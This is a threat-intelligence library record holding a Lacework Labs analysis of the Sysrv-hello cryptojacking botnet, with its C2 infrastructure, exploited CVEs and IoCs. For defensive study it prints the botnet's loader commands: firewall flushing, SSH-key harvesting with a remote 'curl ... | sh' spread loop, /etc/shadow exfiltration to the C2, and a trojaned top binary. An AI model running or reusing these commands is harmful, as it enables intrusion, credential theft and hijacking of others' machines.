# 0-raw-data/ORKL/library/jsons_entries/20ed7f2c-61dc-4383-9544-21aa34713351.json
{
    "id": "20ed7f2c-61dc-4383-9544-21aa34713351",
    "created_at": "2023-01-12T15:06:42.771942Z",
    "updated_at": "2025-03-27T02:14:34.181847Z",
    "deleted_at": null,
    "sha1_hash": "4fd6a10ea2117edfa1d0389313d78af2712c8dc6",
    "title": "2021-04-22 - Sysrv-Hello Expands Infrastructure",
    "authors": "",
    "file_creation_date": "2022-06-01T12:26:21Z",
    "file_modification_date": "2022-06-01T12:26:21Z",
    "file_size": 1604939,
    "plain_text": "# Sysrv-Hello Expands Infrastructure\n\n**lacework.com/blog/sysrv-hello-expands-infrastructure/**\n\n**Chris Hall and Jared Stroud**\n\n**Cloud Security Researchers, Lacework Labs**\n\n\nApril 22, 2021\n\n\n[Sysrv-hello is a multi-architecture Cryptojacking (T1496) botnet that first emerged in late 2020, and employs Golang malware compiled](https://attack.mitre.org/techniques/T1496/)\ninto both Linux and Windows payloads. The malware is equal parts XMRig cryptominer and aggressive botnet-propagator. The\n[propagator leverages MySQL and Tomcat brute forcing (T1110) along with a suite of exploits including those for Atlassian and Apache.](https://attack.mitre.org/techniques/T1496/)\nThe malware also leverages several “No CVE” command execution techniques including those for Jupyter notebook and Tomcat\nManager.\n\n## Key Points\n\nOpportunistic actors are targeting cloud workloads through remote code injection/remote code execution vulnerabilities in\n[PHPUnit,](https://nvd.nist.gov/vuln/detail/CVE-2017-9841) [Apache Solar,](https://nvd.nist.gov/vuln/detail/CVE-2019-0193) [Confluence,](https://nvd.nist.gov/vuln/detail/cve-2019-3396) [Laravel,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3129.) [JBoss,](https://nvd.nist.gov/vuln/detail/CVE-2017-12149) [Jira,](https://nvd.nist.gov/vuln/detail/CVE-2017-11581) [Sonatype,](https://nvd.nist.gov/vuln/detail/CVE-2019-7238) [Oracle WebLogic and](https://nvd.nist.gov/vuln/detail/CVE-2020-14882) [Apache Struts to gain initial access](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)\n[(T1190).](https://attack.mitre.org/techniques/T1190/)\nLateral movement is conducted via SSH keys available on the victim machine and hosts identified from bash history files, ssh\n[config files, and known_hosts files. (T1021.004)](https://attack.mitre.org/techniques/T1021/004/)\nBased on the identified continually expanding C2 infrastructure and Windows compatible builds of the malware, potential for\nbotnet expansion is likely as time continues.\n\n## Botnet Infrastructure\n\n[First documented in early February by Aliyun as “Sysrv-hello”, the sysrv-hello botnet has since expanded with regards to the volume of](https://help.aliyun.com/document_detail/196163.html)\nspecimens and C2 infrastructure. Since early March, five new botnet controllers have been identified with the most recent being IP\n194.145.227.21. Most C2 IPs belong to either AS 48693 Rices Privately owned enterprise, or Des Capital B.V. – AS 213035 Des\nCapital B.V.\n\n**C2** **C2**\n\n194.145.227.21 AS 48693 Rices Privately owned enterprise\n\n194.40.243.98 AS 48693 Rices Privately owned enterprise\n\n31.42.177.123 AS 43641 Sollutium EU LLC\n\n31.210.20.181 AS 213035 Des Capital B.V.\n\n185.239.242.71 AS 213035 Des Capital B.V.\n\n31.210.20.120 AS 213035 Des Capital B.V.\n\n\n-----\n\nExamination of SSH fingerprints data for the C2s uncovered a total of 26 servers that were likely compromised by Sysrv-hello at some\npoint. One server – 185.76.147.189, was found to have historically used both SSH keys currently in use by Sysrv-hello, indicating they\nare likely unique to the botnet’s infrastructure. Shodan reports for IPs sharing the SSH keys show an even distribution of couch db and\nMosquito/MQTT so its possible these services were exploited by sysrv-hello actors.\n\nC2 SSH fingerprint total servers\n\n194.145.227.21 41:c3:8d:22:c1:32:7c:50:40:96:9d:1d:54:fe:74:86 24\n\n31.210.20.120 08:e0:58:cf:13:6f:4e:42:3a:79:a7:14:63:19:0c:ce 2\n\nThere were also indications that the C2 hosts were active participants in the exploitation process. Host 194.145.227.21 hosts an open\n[FTP server which, at the time of this writing, hosted a file name cmd.vm. This file is a component used in the template injection stage of](https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm)\nthe Atlassian Confluence Widget Connector exploit (CVE-2019-3396).\n\nAnother interesting tactic was custom user-agents specifying the CVE for a given exploit. In the example below, the XML component\nthe Oracle WebLogic Server RCE included a curl request with the exploit’s CVE as a user-agent. This is strictly supplied for tracking\npurposes and doesn’t determine the server’s response.\n\n\n-----\n\n## Initial Host Infection\n\nHost infection begins with a bash script (ldr.sh) that performs initial host triage prior to downloading the second stage ELF binary –\nsysrv. The initial bash script changes the default policy to the INPUT, OUTPUT and FORWARD [IPTables’ chains to accept before](https://ipset.netfilter.org/iptables.man.html)\n[flushing any other firewall rules that exist (T1562.004). Next, the ldr script attempts to overwrite content within](https://attack.mitre.org/techniques/T1562/004/)\n[/etc/ld.so.preload (T1485), as well as remove any static host entries for mining pools stored within/etc/hosts.](https://attack.mitre.org/techniques/T1485/)\n\n\n-----\n\n```\niptables -P INPUT ACCEPT\niptables -P OUTPUT ACCEPT\niptables -P FORWARD ACCEPT\niptables -F\nchattr -ia /etc/ld.so.preload\necho &amp;amp;amp;gt; /etc/ld.so.preload\nchattr -ia /etc/hosts\nsed -i '/f2pool.com\\|nanopool.org\\|minexmr.com\\|supportxmr.com\\|c3pool.com/d' /etc/hosts\nAfter killing cryptocurrency miners via process name and removing the Aliyun agent (prevalent in Alibaba cloud\nenvironments), the second stage payload is downloaded. The second stage payload hosted on the staging server is prefixed\nwith “sysrv”-ARCHITECTURE, where ARCHITECTURE is obtained via uname -m. However, after the file is downloaded, the sysrv\nbinary is renamed based on the output of the command below and then launched.\nsys=$(date |md5sum|awk -v n=”$(date +%s)” ‘{print substr($1,1,n%7+6)}’)\nThe bash script then proceeds to identify SSH private keys within /, /root and /home to use for lateral movement (T1021.004)\nagainst IPv4 addresses identified within the user’s bash history,$USER/.ssh/known_hosts and ~/.ssh/config files.\n\n```\n\n-----\n\n```\nKEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F \"IdentityFile\" '{print $2 }')\nKEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)\nHOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F \"HostName\" '{print $2}')\nHOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E \"(ssh|scp)\" | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")\nHOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | uniq)\nIn combination with the SSH keys above, a brute force approach of trying every user against every host with every key identified is performed. User’s on\nthe victim host are identified via home directories with the find command. If authentication is successful, a bash one-liner is executed to download and\nrun the ldr.sh script on the new victim host.\n\n```\n\n-----\n\n```\n  find ~/ /root /home -maxdepth 2 -name '\\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v \"\\.ssh\"\n)\nuserlist=$(echo $USERZ | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\nhostlist=$(echo \"$HOSTS $HOSTS2 $HOSTS3\" | grep -vw 127.0.0.1 | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\nkeylist=$(echo \"$KEYS $KEYS2 $KEYS3\" | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\nfor user in $userlist; do\n  for host in $hostlist; do\n    for key in $keylist; do\n      chmod +r $key; chmod 400 $key\n      ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key [email protected]$host \"(curl --user-agent localssh $cc/ldr.sh || wget --user-agent localssh -q -O - $cc/ldr.sh) | sh\"\n    done\n  done\ndone\nThe Lacework Labs team also identified a curl statement commented out within ldr.sh that would have otherwise exfiltrated the /etc/shadow file via a base64 encoded user-agent string to the\nserver hosting ldr.sh and sysrv. In other various ldr.sh, this command did not have the comment and would be executed.\n#curl –user-agent shell_$(cat /etc/shadow|grep “\\\\$”|base64 -w0) $cc\nOther ldr.sh scripts examined by the Lacework Labs team had slight differences in functionality. While all observed samples downloaded the 2nd stage payload of sysrv, some did not perform the\nlateral movement function. The Lacework Labs team assesses with moderate confidence the scripts are actively being modified while keeping the same filename of ldr.sh so that variants already\ndeployed will still grab the hardcoded value of ldr.sh. This claim is supported by variations of ldr.sh being uploaded to VirusTotal.\nPersistence on Host\nThe sysrv binary dropped to disk is a statically linked 64bit UPX packed Golang ELF binary. This binary contains an embedded cryptocurrency miner, XMRig which is renamed to “[kthreaddi]”. The\nsysrv binary finds a new writable location to drop itself to disk before adding a cron entry (T1053.003). Through multiple sysrv executions, a different cron entry was created each time during\ndynamic analysis. Each binary being written to disk is the same file as sysrv, with the exception of the newly created file not being UPX packed. The code blocks below show observed file\nlocations sysrv was written to along with the corresponding cron entry.\n* * * * * /home/user/.cache/mozilla/firefox/h2od1b24.default-esr/safebrowsing/6zf2ipl\n* * * * * /home/user/.cache/pip/wheels/9d/29/32/q2cszj7oi\n* * * * * /home/user/.cache/pip/http/c/0/9/8/a/dpm2fu\nUpon executing sysrv, the XMRig binary along with the mining configuration file is written to disk in the current directory of execution. Immediately after the execution of XMRig, the XMRig binary and the configuration file are removed via the\nunlinkat syscall.\nunlinkat(AT_FDCWD, \"/home/test/.cache/go-build/2f/.Vvqn9kgF/config.json\", 0) = 0 unlinkat(AT_FDCWD, \"/home/test/.cache/go-build/2f/.Vvqn9kgF/[kthreaddi]\", 0) = 0\nEvading Detection on Host\nThe ldr.sh bash script moves /usr/bin/top to /usr/bin/top_ before creating a bash script at /usr/bin/top which removes the XMRig miner (“[kthreaddi] ”) from the process list via a grep command.\nmv /usr/bin/top /usr/bin/top_ echo '#!/bin/sh /usr/bin/top_ -p $(ps aux|grep -v \"\\[kthreaddi\\]\"|awk \"{print \\$2}\"|grep -v PID|sort -R|head -n20|tr \"\\n\" \",\"|sed s\"/.$//\")' &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt; /usr/bin/top chmod +x /usr/bin/top\nObserved Capabilities of Sysrv\nFile artifacts observed by the Lacework Labs team indicate the propagator has support for the following exploits:\n\n```\n**CVE** **Description**\n\nCVE 2017-9841 Code injection vulnerability in Drupal component PHPUnit\n\nCVE 2019-0193 Apache Solr Remote Code Execution Vulnerability\n\n\n-----\n\n**CVE** **Description**\n\nCVE 2019-3396 Vulnerability in Atlassian Confluence Widget Connector\n\nCVE 2021-3129 Laravel ignition RCE\n\nCVE 2017-11610 Vulnerability in XML-RPC server in Supervisor\n\nCVE 2017-12149 Red Hat JBoss RCE\n\nCVE 2019-11581 Critical Template Injection Vulnerability in Atlassian Jira\n\nServer\n\nCVE 2019-7238 RCE in Sonatype NXRM 3\n\nCVE 2017-5638 Vulnerability in the Apache Struts MVC framework\n\nCVE 2020-14882 Oracle WebLogic Server Remote Code Execution\n\n[A deeper look into these particular CVEs can be found on on a recent Juniper blog post available here. The entirety of the execution](https://blogs.juniper.net/en-us/threat-research/sysrv-botnet-expands-and-gains-persistence)\nflow can be shown in the diagram below.\n\n\n-----\n\n## Windows Variant\n\nAn alternative to ldr.sh is ldr.ps1 for Windows machines. The observed ldr.ps1 is significantly less robust than its Linux counterpart.\nFocusing largely on killing a handful of other processes prior to downloading and executing sys.exe out of a Windows temp directory.\nThe image below captures the functionality of ldr.ps1\n\nUpon executing sys.exe in the following message being displayed, which translates to “Scanning” in Russian.\n\n\n-----\n\nDuring the execution of sys.exe, the XMRig application along with the mining configuration\n\nfile is written to a temporary directory created within AppData\\Local . Just as with the Linux variant, the Windows variation of the miner\nis also called “[kthreaddi].exe”. The same username that was used in the Linux variant was leveraged within this XMRig configuration\nfile as well. Sys.exe is also written in Golang, and shares similar functionality to the Linux counterpart. As “[kthreaddi].exe” begins to\nmine Monero, sys.exe attempts to start infecting other machines.\n\nThe following pcap shows the initial c2 request\n\nperformed during behavioral analysis. In this instance, the server returns the command ‘123654’. While the accepted commands for the\nmalware are unclear, this command preceded both the Monero mining and botnet propagation activities.\n\n## Total Monero Mined\n\nDuring analysis the Lacework Labs team recovered the XMRig configuration file. The configuration was set to mine monero from\nf2pool. Looking up the wallet from f2pool’s website return that at the time of this writing the actors leveraging sysvr have mined slightly\nover 12.1 worth of monero worth $3,928.46 USD. The image below shows the XMRig configuration being sent over the network to the\nmining pool.\n\n\n-----\n\n```\n  [ { \"keepalive\": true, \"url\": \"xmr.f2pool.com:13531\",\n    \"user\":\"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.l32\",\n    \"pass\": \"x\" }\n  ] }\n }\nConclusion\n\n```\n\n-----\n\n```\nThe sysrv malware takes advantage of known vulnerabilities to spread their Cryptojacking malware. Ensuring public facing\napplications (T1190) are kept up to date with the latest security patches is critical to avoid opportunistic adversaries\nfrom compromising systems. Due to the lateral movement capabilities of the initial bash (ldr.sh) script, if an infected host\nis found, it is recommended that other hosts listed in authorized_hosts, bash_history, and user’s ~/.ssh/config are\ninspected for compromise.\nAll IOCs can be found on the Lacework Labs GitHub. Also, please follow @LaceworkLabs Twitter to keep up with our latest\nresearch.\nIoCs\n\n```\nldr.sh c07838598435a26f658654db4ce816914e6cfe70056382471362407d6093e1fa\n\nldr.sh ac0d8aceb01077b5ff3de02c6c63971054104bedabf3732ed169646a3f7e10e9\n\nldr.sh 6464434e5040b6bab0dd8b55b906dc1d068a21de5684e75e5eb51aa2608ef0ad\n\nldr.ps1 28dcdabaab2837b944a260048792ee4141ab0b3061637d7b9097706292c76877\n\nsysrv.exe f115f7826b7857be4522b84a17077a49d0ec0835010da31060acf85bab87778c\n\nsysrv.exe (UPX packed) 80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96\n\nsysrv d50864f13378b333784f7469df98ef2ea438489ccf0649622897a7712a9c18f8\n\nsysrv (UPX packed) 544d20fc286d0803dee86a9c34b4c348333e320a4e33fd2730079701cb6e108f\n\n\nXMRig\nUsername\n\n\n49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa\n\n\nPool Used xmr.f2pool.com\n\nIPv4 194.145.227.21\n\nIPv4 194.40.243.98\n\nIPv4 31.42.177.123\n\nIPv4 31.210.20.181\n\nIPv4 31.210.20.120\n\nIPv4 185.239.242.71\n\n## MITRE ATT&CK Mappings\n\n**TID** **Technique Name** **Observed Functionality**\n\nT1496 Resource Hijacking Cryptojacking\n\nT1110 Brute Force The sysrv propagation component attempts to brute force MySQL and Tomcat\ninstances.\n\nT1190 Exploiting Public Applications Leveraging CVEs to exploit public facing applications.\n\n\nT1027.002 Obfuscated files or information:\nSoftware Packing\n\n\n2nd stage payloads were UPX packed.\n\n\nT1132.001 Data Encoding: Standard Encoding Base64 was leveraged within ldr.sh scripts\n\n\n-----\n\n**TID** **Technique Name** **Observed Functionality**\n\nT1059.004 Command and Scripting Interpreter Bash scripts were leveraged for spreading their Cryptojacking malware as well\nas the propagator.\n\n\nT1021.004 Lateral Movement – Remote\nServices: SSH\n\nT1562.001 Impair Defenses: Disable or Modify\nTools\n\nT1070.004 Indicator Removal on Host: File\nDeletion\n\nT1140 Deobfuscate/Decode Files or\nInformation\n\n\nBash scripts leveraged ssh keys to move to hosts within bash_history, known\nhost files, and ssh configs.\n\nAliyun agent (Alibaba Cloud) is removed. IPTables are flushed and default\npolicy is changed to allow.\n\nThe sysrv payload deletes the underlying XMRig binary after it is launched in\nLinux environments.\n\nBoth the ELF and Win32 variants of sysrv/sys.exe have embedded files.\n\n\nT1485 Data Destruction The ldr.sh bash script has been observed overwriting contents of\n/etc/ld.so.preload\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-22 - Sysrv-Hello Expands Infrastructure.pdf"
    ],
    "report_names": [
        "2021-04-22 - Sysrv-Hello Expands Infrastructure.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536002,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1654086381,
    "ts_modification_date": 1654086381,
    "files": {
        "pdf": "https://archive.orkl.eu/4fd6a10ea2117edfa1d0389313d78af2712c8dc6.pdf",
        "text": "https://archive.orkl.eu/4fd6a10ea2117edfa1d0389313d78af2712c8dc6.txt",
        "img": "https://archive.orkl.eu/4fd6a10ea2117edfa1d0389313d78af2712c8dc6.jpg"
    }
}